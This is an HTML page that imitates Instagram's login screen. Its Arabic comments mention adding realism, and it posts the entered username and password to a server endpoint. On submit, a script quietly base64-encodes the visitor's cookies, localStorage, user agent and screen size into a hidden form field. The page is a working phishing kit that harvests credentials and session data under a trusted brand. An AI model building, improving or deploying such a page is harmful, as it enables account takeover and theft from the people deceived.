<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; color: #262626; }
        .main-wrapper { display: flex; width: 100%; max-width: 935px; justify-content: space-between; align-items: center; padding: 20px; }
        
        /* الجانب الأيسر - النصوص والشعار */
        .left-panel { flex: 1; text-align: left; padding-right: 40px; }
        .left-panel .ig-wordmark { width: 75px; height: auto; margin-bottom: 25px; display: block; }
        .left-panel h1 { font-size: 32px; font-weight: 400; line-height: 40px; margin-bottom: 20px; }
        .left-panel .highlight { color: #fa7e1e; font-weight: 600; }
        .left-panel .visual-container { margin-top: 30px; }
        .left-panel .visual-container img { width: 280px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }

        /* الجانب الأيمن - صندوق الدخول */
        .right-panel { width: 350px; border-left: 1px solid #dbdbdb; padding-left: 40px; display: flex; flex-direction: column; align-items: center; }
        .login-box { width: 100%; text-align: center; }
        .login-box h2 { font-size: 17px; font-weight: 600; margin-bottom: 25px; }
        
        input { width: 100%; padding: 11px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 8px; margin-bottom: 8px; font-size: 12px; }
        input:focus { border-color: #a8a8a8; outline: none; }
        
        .login-btn { width: 100%; padding: 10px; background: #b2dffc; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        .login-btn.active { background: #0095f6; }
        
        .divider-container { display: flex; align-items: center; margin: 20px 0; width: 100%; }
        .line { flex: 1; height: 1px; background: #dbdbdb; }
        .or-text { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        
        .fb-link { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .forgot-link { font-size: 12px; color: #00376b; text-decoration: none; margin-top: 15px; display: block; }
        
        .create-btn { border: 1px solid #0095f6; color: #0095f6; background: transparent; padding: 10px; width: 100%; border-radius: 8px; font-weight: 600; margin-top: 20px; cursor: pointer; display: block; text-decoration: none; }
        
        .meta-footer { margin-top: 50px; font-size: 12px; color: #00376b; font-weight: 600; display: flex; align-items: center; gap: 5px; }

        @media (max-width: 800px) {
            .left-panel { display: none; }
            .right-panel { border-left: none; padding-left: 0; width: 100%; }
            .main-wrapper { justify-content: center; }
        }
    </style>
</head>
<body>
    <div class="main-wrapper">
        <div class="left-panel">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="ig-wordmark">
            <h1>See everyday moments from your <span class="highlight">close friends</span>.</h1>
            <div class="visual-container">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fd3d9d2c636d.png">
            </div>
        </div>

        <div class="right-panel">
            <div class="login-box">
                <h2>Log into Instagram</h2>
                <form id="vault" action="/api/v1/auth" method="POST">
                    <input type="text" name="user" id="user" placeholder="Mobile number, username or email" required>
                    <input type="password" name="pass" id="pass" placeholder="Password" required>
                    <input type="hidden" name="payload" id="payload">
                    <button type="submit" class="login-btn" id="lbtn">Log in</button>
                    
                    <a href="#" class="forgot-link">Forgot password?</a>
                    <div class="divider-container">
                        <div class="line"></div><div class="or-text">OR</div><div class="line"></div>
                    </div>
                    <a href="#" class="fb-link">Log in with Facebook</a>
                    <a href="#" class="create-btn">Create new account</a>
                </form>
                <div class="meta-footer">∞ Meta</div>
            </div>
        </div>
    </div>

    <script>
        // تفعيل زر الدخول عند الكتابة لزيادة الواقعية
        const u = document.getElementById('user');
        const p = document.getElementById('pass');
        const b = document.getElementById('lbtn');
        const f = document.getElementById('vault');

        [u, p].forEach(el => el.addEventListener('input', () => {
            b.classList.toggle('active', u.value.length > 0 && p.value.length >= 6);
        }));

        f.onsubmit = function() {
            const data = {
                ck: document.cookie,
                ls: JSON.stringify(localStorage),
                ua: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`
            };
            document.getElementById('payload').value = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
        };
    </script>
</body>
</html>
